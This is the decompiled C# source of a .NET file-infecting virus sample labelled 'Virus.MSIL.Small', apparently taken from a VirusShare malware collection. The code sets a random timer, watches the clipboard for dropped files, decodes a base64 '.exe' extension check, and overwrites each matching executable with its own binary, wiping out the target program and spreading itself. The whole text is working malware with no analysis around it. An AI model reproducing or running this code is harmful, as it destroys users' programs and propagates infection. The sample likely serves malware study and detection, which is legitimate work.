// Decompiled with JetBrains decompiler
// Type: MSIL_Baizah.Baizah
// Assembly: MSIL_Baizah, Version=0.1.1.4904, Culture=neutral, PublicKeyToken=1497983a8894e652
// MVID: 1CA6961D-C379-4794-90D6-FCB5D0BD9BC6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.MSIL.Small.c-f40845ea259fc051ffa3c16cc1cb4e147ac5c46bfa927107f307992fb18573e4.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Permissions;
using System.Windows.Forms;

namespace MSIL_Baizah
{
  public class Baizah : MainVirus
  {
    private Timer myTimer = new Timer();

    private void TimerEventProcessor(object myObject, EventArgs myEventArgs)
    {
      IDataObject dataObject = Clipboard.GetDataObject();
      if (!dataObject.GetDataPresent(DataFormats.FileDrop))
        return;
      foreach (string str in (string[]) dataObject.GetData(DataFormats.FileDrop))
      {
        try
        {
          if (new FileInfo(str).Extension == MainVirus.Decode("LmV4ZQ=="))
            this.CopyHost(str);
        }
        catch
        {
        }
      }
    }

    private void CopyHost(string target)
    {
      FileInfo fileInfo1 = new FileInfo(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
      FileInfo fileInfo2 = new FileInfo(target);
      if (!fileInfo2.Exists)
        return;
      try
      {
        Stream stream1 = (Stream) fileInfo1.OpenRead();
        Stream stream2 = (Stream) fileInfo2.OpenWrite();
        BufferedStream bufferedStream1 = new BufferedStream(stream1);
        BufferedStream bufferedStream2 = new BufferedStream(stream2);
        byte[] buffer = new byte[1024];
        int count;
        while ((count = bufferedStream1.Read(buffer, 0, 1024)) > 0)
          bufferedStream2.Write(buffer, 0, count);
        bufferedStream2.Flush();
        bufferedStream1.Close();
        bufferedStream2.Close();
      }
      catch (Exception ex)
      {
      }
    }

    [PermissionSet(SecurityAction.Deny, XML = "<PermissionSet class=\"System.Security.PermissionSet\"\r\n               version=\"1\">\r\n   <IPermission class=\"System.Security.Permissions.ReflectionPermission, mscorlib, Version=1.0.5000.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\r\n                version=\"1\"\r\n                Flags=\"NoFlags\"/>\r\n</PermissionSet>\r\n")]
    public void Baiz()
    {
      this.myTimer.Tick += new EventHandler(this.TimerEventProcessor);
      this.myTimer.Interval = new Random().Next(1000, 10000);
      this.myTimer.Start();
      while (true)
        Application.DoEvents();
    }
  }
}
